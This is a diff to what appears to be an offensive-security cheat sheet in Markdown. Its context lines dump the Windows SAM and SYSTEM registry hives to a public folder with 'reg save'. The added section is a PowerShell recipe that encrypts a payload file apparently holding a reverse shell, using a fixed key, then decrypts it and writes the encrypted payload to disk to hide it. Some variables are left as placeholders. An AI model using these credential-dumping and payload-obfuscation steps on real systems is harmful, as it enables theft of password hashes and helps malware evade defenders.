@@ -135,3 +135,63 @@ reg save hklm\sam $env:PUBLIC\Documents\hi_sam
 reg save hklm\system $env:PUBLIC\Documents\hi_system
 ```
 
+
+
+
+
+# Symmetric Encryption
+
+Apply symmetric encryption to encrypt payload
+
+```powershell
+# Use with one-line command only
+# Initial vars
+$PayloadPath = "$pwd\rs_pay_final"
+# $key = "1234567890123456" #<16, 24, 32 chars>
+# $skey = [byte[]]("$key").ToCharArray()
+$skey = (1..16)
+
+# create secure string
+$content = cat $PayloadPath
+
+#---------- Encrypt -------------
+$ss = ConvertTo-SecureString -String "$content" -Force -AsPlainText
+$cipher = ConvertFrom-SecureString -SecureString $ss -Key $skey #Converts a secure string to an encrypted standard string
+
+#----------- Decrypt -------------
+# Apply to: https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.securestringtobstr?view=netcore-3.1#moniker-applies-to
+# Ref: https://stackoverflow.com/a/28353003
+
+# ----- Prepare variable for decrypt
+$cipher = "..."
+$skey = [byte[]]
+$ss = ConvertTo-SecureString -String $cipher -Key $skey #Converts an encrypted standard string to a secure string
+
+# ----- DECRYPT METHOD 1
+Function ConvertTo-UnsecureString {
+   Param (
+       [System.Security.SecureString]$ss
+   )
+   Try { # main decode function
+       $ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToGlobalAllocUnicode($ss)
+       [System.Runtime.InteropServices.Marshal]::PtrToStringUni($ptr)
+   }
+   Finally {
+       [System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($ptr)
+   }
+}
+$plain = ConvertTo-UnsecureString $ss
+
+# ----- DECRYPT METHOD 2
+$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($ss)
+$plain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
+
+echo $plain
+
+# ---------- Print output -------------------
+Write-Host -NoNewline "$cipher"
+#-------------- Write encrypted payload to file -------
+Out-File -FilePath .\encrypted_rs_pay -InputObject "$func`n$cipher" -Encoding ASCII
+Out-File -FilePath "$pwd\encrypted_payload" -InputObject "$cipher" -Encoding ASCII -NoNewline ;
+```
+
